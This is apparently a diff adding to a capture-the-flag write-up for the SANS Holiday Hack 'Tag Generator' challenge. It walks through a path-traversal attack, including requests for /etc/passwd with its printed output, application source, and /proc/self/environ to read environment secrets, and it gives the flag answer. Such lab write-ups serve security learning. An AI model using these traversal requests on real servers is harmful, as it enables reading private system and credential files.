@@ -229,13 +229,109 @@ It works!
 
 Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.
 
+![](screenshots/objective-8-completed.jpg)
+
+### Hints:
+
+- Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!
+- I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?
+- We might be able to find the problem if we can get source code!
+- Is there an endpoint that will print arbitrary files?
+- If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!
+- If you find a way to execute code blindly, I bet you can redirect to a file then download that file!
+- Can you figure out the path to the script? It's probably on error pages!
+- Once you know the path to the file, we need a way to download it!
+
+
+
 - Step 1: Get an error by doing and upload of an unsupported file:
 ~~~
-
 Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201217-1-d0s4xy.txt
-
 ~~~
 
+- Step 2: Check for file inclusion vulns
+	- https://tag-generator.kringlecastle.com/etc/passwd
+~~~
+Something went wrong!
+Error in /app/lib/app.rb: Route not found
+~~~
+
+- Step 3: Try a large image from holidayhack
+~~~
+ERROR
+413 Request Entity Too Large
+nginx/1.19.5
+~~~
+
+- Step 4: This is interesting in the /js/app.js file.
+~~~
+        success: function (data) {
+          $('.uploadForm')[0].reset();
+          $('[for=file-1] span').text('Select file(s)');
+            setTimeout(() => {
+              data.forEach(id => {
+                var img = $('<img id="dynamic">');
+                img.attr('src', `/image?id=${id}`);
+                img.on('load', () => {
+                  const imgElement = img[0];
+                  var imgInstance = new fabric.Image(imgElement, {
+                    left: (canvas.width - imgElement.width) / 2,
+                    top: (canvas.height - imgElement.height) / 2,
+                    angle: 0,
+                    opacity: 1
+~~~ 
+- Step 5: Didn't think I was getting anything with this, but I just needed to view the rreponse in burp.
+~~~
+https://tag-generator.kringlecastle.com/image?id=../etc/passwd
+
+Response:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+app:x:1000:1000:,,,:/home/app:/bin/bash
+
+~~~
+ 
+- Step 6: Notice that "app" user
+- Step 7: Try this path again, but with LFI.
+~~~
+https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb
+~~~
+- Step 8: Review the code from app.rb and then try something else.
+- Step 9: Google for how to get environment variables through LFI. Then try this...in Burp.
+~~~
+GET /image?id=../proc/self/environ HTTP/1.1
+Host: tag-generator.kringlecastle.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+~~~
+
+Here's the result!
+
+![](screenshots/tag-generator-env-response.png)
+
+Answer: "JackFrostWasHere"
 
 
 ## Challenges
